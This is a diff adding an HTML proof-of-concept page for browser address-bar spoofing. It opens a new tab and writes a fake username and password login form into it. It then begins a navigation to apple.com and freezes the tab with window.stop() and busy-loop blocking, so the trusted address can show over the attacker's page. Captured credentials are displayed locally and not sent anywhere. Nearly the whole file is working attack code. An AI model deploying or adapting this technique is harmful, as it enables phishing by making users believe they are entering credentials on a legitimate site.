@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+
+    <script>
+      const nativeOpen = window.open.bind(window);
+    </script>
+  </head>
+
+  <body>
+    <button id="start">CLICK HERE</button>
+
+    <script>
+      const TRUSTED_URL = "https://apple.com";
+
+      document.getElementById("start").onclick = function () {
+        this.remove();
+
+        const newTab = nativeOpen("about:blank", "_blank");
+
+        newTab.document.open();
+
+        newTab.document.write(`
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+
+  <title>attacker pahe</title>
+
+  <style>
+    body {
+      font-family: system-ui;
+      max-width: 350px;
+      margin: 70px auto;
+      padding: 20px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 6px 0;
+      box-sizing: border-box;
+    }
+
+    pre {
+      padding: 10px;
+      background: #eee;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+  </style>
+</head>
+
+<body>
+  <h2>Address Bar Spoofing New</h2>
+
+  <form id="login">
+    <input id="username" placeholder="Username" required>
+    <input id="password" type="password" placeholder="Password" required>
+    <button type="submit">LOGIN</button>
+  </form>
+
+  <h3>Captured locally:</h3>
+  <pre id="output">Waiting..,.</pre>
+
+  <script>
+    const BLOCK_MS = 250;
+    const GAP_MS = 30;
+
+    document.getElementById("login").onsubmit = function (event) {
+      event.preventDefault();
+
+      const captured = {
+        username: document.getElementById("username").value,
+        password: document.getElementById("password").value,
+        capturedAt: new Date().toISOString(),
+        transmitted: false
+      };
+
+      document.getElementById("output").textContent =
+        JSON.stringify(captured, null, 2);
+    };
+
+    setTimeout(function () {
+      location.href = ${JSON.stringify(TRUSTED_URL)};
+    }, 1);
+
+    function freezeChunk(ms) {
+      const end = performance.now() + ms;
+
+      while (performance.now() < end) {}
+    }
+
+    function cooperativeFreeze() {
+      freezeChunk(BLOCK_MS);
+      setTimeout(cooperativeFreeze, GAP_MS);
+    }
+
+    setTimeout(function () {
+      try {
+        window.stop();
+      } catch (error) {}
+
+      cooperativeFreeze();
+    }, 25);
+  <\/script>
+</body>
+</html>
+      `);
+
+        newTab.document.close();
+      };
+    </script>
+  </body>
+</html>
